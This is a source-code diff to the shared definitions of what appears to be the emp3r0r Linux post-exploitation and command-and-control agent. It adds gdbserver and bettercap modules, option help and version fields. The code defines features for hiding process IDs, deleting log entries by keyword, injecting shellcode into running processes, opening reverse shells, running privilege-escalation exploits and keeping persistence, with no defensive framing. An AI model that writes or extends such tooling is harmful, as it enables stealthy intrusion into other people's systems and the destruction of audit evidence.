@@ -42,7 +42,7 @@ var (
 	CDNProxy = ""
 
 	// SocketName name of our unix socket
-	SocketName = AgentRoot + "/.s6Y4tDtahIuL"
+	SocketName = AgentRoot + "/.socket"
 
 	// HIDE_PIDS all the processes
 	HIDE_PIDS = []string{strconv.Itoa(os.Getpid())}
@@ -62,11 +62,14 @@ var (
 	// UtilsPath binary path of utilities
 	UtilsPath = AgentRoot + "/bin"
 
+	// DefaultShell the shell to use, use static bash binary when possible
+	DefaultShell = UtilsPath + "/bash"
+
 	// Libemp3r0rFile shard library of emp3r0r, for hiding and persistence
 	Libemp3r0rFile = UtilsPath + "/libe.so"
 
 	// PIDFile stores agent PID
-	PIDFile = AgentRoot + "/.e.lock"
+	PIDFile = AgentRoot + "/.pid"
 
 	// CCPort port of c2
 	CCPort = "[cc_port]"
@@ -122,7 +125,7 @@ const (
 	Unknown = "Unknown"
 )
 
-// Module names
+// built-in module names
 const (
 	ModCMD_EXEC     = "cmd_exec"
 	ModCLEAN_LOG    = "clean_log"
@@ -135,6 +138,8 @@ const (
 	ModINJECTOR     = "injector"
 	ModGET_ROOT     = "get_root"
 	ModREVERSEPROXY = "reverse_proxy"
+	ModGDB          = "gdbserver"
+	ModBettercap    = "bettercap"
 )
 
 // PersistMethods CC calls one of these methods to get persistence, or all of them at once
@@ -147,8 +152,8 @@ var PersistMethods = map[string]string{
 	"patcher":    "patcher",
 }
 
-// Module help info
-var ModuleDocs = map[string]string{
+// Module help info, ls_modules shows this
+var ModuleComments = map[string]string{
 	ModCMD_EXEC:     "Run a single command on a target",
 	ModCLEAN_LOG:    "Delete lines containing keyword from *tmp logs",
 	ModLPE_SUGGEST:  "Run linux-smart-enumeration or linux exploit suggester",
@@ -157,9 +162,49 @@ var ModuleDocs = map[string]string{
 	ModPORT_FWD:     "Port mapping from agent to CC (or vice versa), via HTTP2 (or other) tunnel",
 	ModSHELL:        "Run custom bash on target, a perfect reverse shell",
 	ModVACCINE:      "Vaccine helps you install additional tools on target system",
-	ModINJECTOR:     "Inject shellcode into a running process with GDB",
+	ModINJECTOR:     "Inject shellcode/loader.so into a running process",
 	ModGET_ROOT:     "Try some built-in LPE exploits",
 	ModREVERSEPROXY: "Manually proxy agents who are unable to use our forward proxy",
+	ModBettercap:    "Remote bettercap, offered as an interactive shell",
+	ModGDB:          "Remote gdbserver, debug anything",
+}
+
+// Module help for options, does not include every module since not all modules need args
+// help module shows this
+var ModuleHelp = map[string]map[string]string{
+	ModCMD_EXEC: {
+		"cmd_to_exec": "Press TAB for some hints",
+	},
+	ModCLEAN_LOG: {
+		"keyword": "Delete all log entries containing this keyword",
+	},
+	ModLPE_SUGGEST: {
+		"lpe_helper": "'linux-smart-enumeration' or 'linux-exploit-suggester'?",
+	},
+	ModPROXY: {
+		"port":   "Port of our local proxy server",
+		"status": "Turn proxy on/off",
+	},
+	ModPORT_FWD: {
+		"to":          "Address:Port (to forward to) on agent/CC side",
+		"listen_port": "Listen port on CC/agent side",
+		"switch":      "Turn port mapping on/off, or use `reverse` mapping",
+	},
+	ModSHELL: {
+		"shell": "Shell program to run",
+		"args":  "Command line args of the shell program",
+		"port":  "The (sshd) port that our shell will be using",
+	},
+	ModINJECTOR: {
+		"pid":    "Target process PID, set to 0 to start a new process (sleep)",
+		"method": "Use `inject_shellcode` to inject any shellcode, use `*_loader` to inject loader.so",
+	},
+	ModREVERSEPROXY: {
+		"addr": "Target host to proxy, we will connect to it and proxy it out",
+	},
+	ModBettercap: {
+		"args": "Command line args for bettercap",
+	},
 }
 
 // Config build.json config file
@@ -184,6 +229,7 @@ type Config struct {
 // SystemInfo agent properties
 type SystemInfo struct {
 	Tag         string        `json:"Tag"`         // identifier of the agent
+	Version     string        `json:"Version"`     // agent version
 	Transport   string        `json:"Transport"`   // transport the agent uses (HTTP2 / CDN / TOR)
 	Hostname    string        `json:"Hostname"`    // Hostname and machine ID
 	Hardware    string        `json:"Hardware"`    // machine details and hypervisor
@@ -216,6 +262,7 @@ type AgentProcess struct {
 type MsgTunData struct {
 	Payload string `json:"payload"` // payload
 	Tag     string `json:"tag"`     // tag of the agent
+	Time    string `json:"time"`    // timestamp
 }
 
 // H2Conn add context to h2conn.Conn
